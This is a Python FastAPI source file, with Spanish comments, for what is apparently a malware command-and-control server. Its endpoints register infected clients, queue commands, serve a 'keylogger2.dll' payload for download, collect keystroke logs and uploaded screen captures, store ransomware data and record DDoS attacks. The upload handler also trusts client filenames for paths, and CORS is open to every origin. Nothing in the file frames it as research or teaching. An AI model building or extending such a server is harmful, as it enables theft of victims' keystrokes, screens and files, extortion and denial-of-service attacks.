from fastapi import FastAPI, Depends, HTTPException, Response, status, File, UploadFile
from sqlalchemy.orm import Session
import database, schemas, repository, models
from typing import List
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import datetime
import os
from pathlib import Path
import shutil
app = FastAPI()

directory = "directorio_imagenes"
app.mount("/imagenes", StaticFiles(directory=directory), name="imagenes")
app.mount("/static", StaticFiles(directory="static"), name="static")


def get_db():
    db = database.SessionLocal()
    try:
        yield db
    finally:
        db.close()

models.Base.metadata.create_all(bind=database.engine) 

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Permite todas las origenes
    allow_credentials=True,
    allow_methods=["*"],  # Permite todos los métodos
    allow_headers=["*"],  # Permite todos los headers
)

@app.get("/prueba/")
def prueba(db: Session = Depends(get_db)):
    return "Hola que tal"

@app.post("/admins/", response_model=schemas.Admin)
def create_admin(admin: schemas.AdminCreate, db: Session = Depends(get_db)):
    db_admin = repository.create_admin(db, admin)
    return db_admin


@app.get("/admins/", response_model=list[schemas.Admin])
def read_admins(db: Session = Depends(get_db)):
    admins = repository.get_admins(db)
    return admins


@app.post("/clients/", response_model=schemas.Client)
def create_client(client: schemas.ClientCreate, db: Session = Depends(get_db)):
    
    new_client = repository.create_client(db, client)
    db.commit()
    db.refresh(new_client)

    # Construye la ruta del nuevo directorio basado en el client_id del nuevo cliente
    client_directory = os.path.join(directory, str(new_client.id))
    
    # Verifica si el directorio ya existe, si no, lo crea
    if not os.path.exists(client_directory):
        os.makedirs(client_directory)

    # Retorna la instancia del cliente recién creada
    return new_client


@app.get("/clients/", response_model=List[schemas.Client])
def read_clients(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    return repository.get_clients(db, skip=skip, limit=limit)


@app.post("/commands/", response_model=schemas.Command)
def create_command(command: schemas.CommandCreate, db: Session = Depends(get_db)):
    return repository.create_command(db, command)


@app.get("/commands/", response_model=List[schemas.Command])
def read_commands(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    return repository.get_commands(db, skip=skip, limit=limit)


@app.get("/clients/{client_id}/commands/", response_model=List[schemas.Command])
def read_commands_for_client(client_id: int, skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    return repository.get_commands_by_client_id(db, client_id, skip=skip, limit=limit)

@app.get("/get-text-file/")
async def get_text_file():
    file_path = "static/keylogger2.dll"
    return FileResponse(
        path=file_path, 
        media_type='application/octet-stream', 
        headers={"Content-Disposition": f"attachment; filename={file_path.split('/')[-1]}"}
    )

@app.put("/keystroke-logs/", response_model=schemas.KeystrokeLog)
def upsert_keystroke_log(keystroke_log: schemas.KeystrokeLogCreate, db: Session = Depends(get_db)):
    return repository.upsert_keystroke_log(db, keystroke_log)


@app.get("/keystroke-logs/", response_model=List[schemas.KeystrokeLog])
def read_keystroke_logs(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    keystroke_logs = repository.get_keystroke_logs(db, skip=skip, limit=limit)
    return keystroke_logs


@app.get("/client-info/")
def get_client_info():
    return {
        "client_id": "1",
        "ip_address": "192.168.1.23",
        "operating_system": "Windows",
        "ransomware": True,
        "keylogger": True,
        "screencapture": True,
        "cifrado": False,
        "polling": 10,
        "id": 1,
        "last_seen": datetime.datetime.now().isoformat(),  # Genera una fecha y hora actual
        "is_active": True
    }

@app.delete("/commands/{command_id}", status_code=204)
def delete_command(command_id: int, db: Session = Depends(get_db)):
    db_command = repository.delete_command(db, command_id)
    if db_command is None:
        raise HTTPException(status_code=404, detail="Comando no encontrado")
    return Response(status_code=status.HTTP_204_NO_CONTENT)

@app.post("/ransomware-data/", response_model=schemas.RansomwareData)
def create_ransomware_info(ransomware_data: schemas.RansomwareDataCreate, db: Session = Depends(get_db)):
    return repository.create_ransomware_data(db, ransomware_data)

@app.get("/ransomware-data/{client_id}", response_model=schemas.RansomwareData)
def get_ransomware_info(client_id: int, db: Session = Depends(get_db)):
    ransomware_info = repository.get_ransomware_data(db, client_id)
    if ransomware_info is None:
        raise HTTPException(status_code=404, detail="Información de Ransomware no encontrada para el cliente especificado")
    return ransomware_info

@app.get("/ransomware-data/", response_model=List[schemas.RansomwareData])
def read_all_ransomware_data(db: Session = Depends(get_db)):
    return repository.get_all_ransomware_data(db)

@app.post("/ddos-attacks/", response_model=schemas.DDoSAttack)
def create_ddos_attack(attack: schemas.DDoSAttackCreate, db: Session = Depends(get_db)):
    return repository.create_ddos_attack(db, attack)

@app.get("/ddos-attacks/", response_model=List[schemas.DDoSAttack])
def read_ddos_attacks(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):
    attacks = repository.get_ddos_attacks(db, skip=skip, limit=limit)
    return attacks

@app.put("/clients/{client_id}", response_model=schemas.Client)
def update_client(client_id: int, client_update: schemas.ClientUpdate, db: Session = Depends(get_db)):
    # Obtener el cliente de la base de datos
    db_client = db.query(models.Client).filter(models.Client.id == client_id).first()
    if not db_client:
        raise HTTPException(status_code=404, detail="Cliente no encontrado")

    # Actualizar los campos proporcionados
    update_data = client_update.dict(exclude_unset=True)
    for key, value in update_data.items():
        setattr(db_client, key, value)

    db.commit()
    db.refresh(db_client)
    return db_client

@app.put("/commands/{command_id}", response_model=schemas.Command)
def update_command_api(command_id: int, command: schemas.CommandUpdate, db: Session = Depends(get_db)):
    updated_command = repository.update_command(db, command_id, command)
    if updated_command is None:
        raise HTTPException(status_code=404, detail="Comando no encontrado")
    return updated_command


@app.delete("/ransomware-data/{client_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_ransomware_data_endpoint(client_id: int, db: Session = Depends(get_db)):
    if repository.delete_ransomware_data(db, client_id):
        return Response(status_code=status.HTTP_204_NO_CONTENT)
    else:
        raise HTTPException(status_code=404, detail="Ransomware data not found")


@app.post("/upload/")
async def upload_image(file: UploadFile = File(...)):
    user_id = file.filename.split("-")[0]
    directory_path = Path(f"directorio_imagenes/{user_id}")
    directory_path.mkdir(parents=True, exist_ok=True)
    file_location = directory_path / file.filename

    # Aquí ya tienes el contenido del archivo en 'file_bytes', simplemente escribe esos bytes en el archivo.
    with open(file_location, "wb") as f:
        file_bytes = await file.read()
        f.write(file_bytes)

    # Aquí guardarías file_location en la base de datos, si es necesario
    return {"info": f"file '{file.filename}' saved at '{file_location}'"}

@app.get("/listar-imagenes/", response_model=List[str])
async def listar_imagenes():
    return os.listdir(directory)

@app.put("/clients/{client_id}", response_model=schemas.Client)
def update_client_endpoint(client_id: int, client_data: schemas.ClientUpdate, db: Session = Depends(get_db)):
    updated_client = repository.update_client(db, client_id, client_data)
    if updated_client is None:
        raise HTTPException(status_code=404, detail="Cliente no encontrado")
    return updated_client

@app.put("/ddos-attacks/{ddos_attack_id}", response_model=schemas.DDoSAttack)
def upsert_ddos_attack(ddos_attack_id: int, ddos_attack: schemas.DDoSAttackCreateOrUpdate, db: Session = Depends(get_db)):
    updated_or_new_attack = repository.upsert_ddos_attack(db, ddos_attack_id, ddos_attack)
    return updated_or_new_attack

@app.put("/ransomware-data/{client_id}", response_model=schemas.RansomwareData)
def update_or_create_ransomware_data(client_id: int, ransomware_data: schemas.RansomwareDataCreateOrUpdate, db: Session = Depends(get_db)):
    return repository.create_or_update_ransomware_data(db, client_id, ransomware_data)

@app.get("/clients/{client_id}", response_model=schemas.Client)
def get_client(client_id: int, db: Session = Depends(get_db)):
    client = db.query(models.Client).filter(models.Client.id == client_id).first()
    if client is None:
        raise HTTPException(status_code=404, detail="Cliente no encontrado")
    return client